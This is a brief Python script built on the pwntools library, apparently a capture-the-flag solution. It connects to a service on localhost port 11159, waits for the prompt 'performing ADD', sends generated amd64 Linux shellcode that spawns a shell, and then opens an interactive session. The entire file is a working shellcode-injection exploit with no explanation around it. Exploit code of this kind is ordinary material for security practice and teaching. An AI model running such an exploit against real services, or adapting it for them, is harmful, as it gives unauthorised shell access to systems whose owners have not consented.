from pwn import *

r = remote("127.0.0.1", 11159)
# context.log_level = "debug"
context(os="linux", arch="amd64")

shellcode = asm(shellcraft.sh())
r.recvuntil(b"performing ADD")
r.sendline(shellcode)
r.interactive()